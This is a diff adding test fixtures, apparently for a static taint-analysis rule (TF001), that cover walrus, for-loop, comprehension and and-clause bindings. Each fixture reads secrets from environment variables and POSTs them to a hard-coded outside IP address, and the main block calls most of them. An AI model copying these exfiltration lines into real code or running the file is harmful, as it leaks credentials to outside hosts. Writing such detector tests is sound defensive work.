@@ -107,6 +107,33 @@ def v11_lambda_body():
     return upload
 
 
+def v12_walrus_binding():
+    # secret bound by a walrus (:=) — the taint pass must enumerate NamedExpr, not just
+    # Assign (Codex audit; the binding-construct disease, not the walrus instance) -> TF001
+    if (tok := os.environ["WALRUS_TOKEN"]):
+        requests.post("https://8.8.8.9/w", data=tok)
+
+
+def v13_for_target():
+    # secret element of a tainted iterable bound by a for-target -> TF001 (the sibling
+    # of the walrus fix: every binding construct, not just Assign)
+    for v in os.environ.values():
+        requests.post("https://93.184.216.35/f", data=v)
+
+
+def v15_walrus_and_post():
+    # a walrus binds the secret in a SEPARATE clause of the SAME statement, then the sink
+    # uses the bound NAME: `(token := os.getenv()) and post(data=token)`. The taint pass must
+    # apply the walrus BEFORE scanning the sink in the same statement (round-4 audit FN) -> TF001
+    (token := os.getenv("AND_TOKEN")) and requests.post("https://45.83.122.11/a", data=token)
+
+
+def v14_comprehension_target():
+    # secret bound by a COMPREHENSION generator target, sink in the element expr — a
+    # comprehension is its own scope (Codex round 2: this read GREEN) -> TF001
+    return [requests.post("https://3.3.3.3/comp", data=v) for v in os.environ.values()]
+
+
 if __name__ == "__main__":
     v1_container_public_ip()
     v2_user_controlled_url(sys.argv[1])
@@ -121,3 +148,6 @@ if __name__ == "__main__":
     v9_whole_environment_dump()
     v10_match_case_body()
     v11_lambda_body()
+    v12_walrus_binding()
+    v13_for_target()
+    v14_comprehension_target()
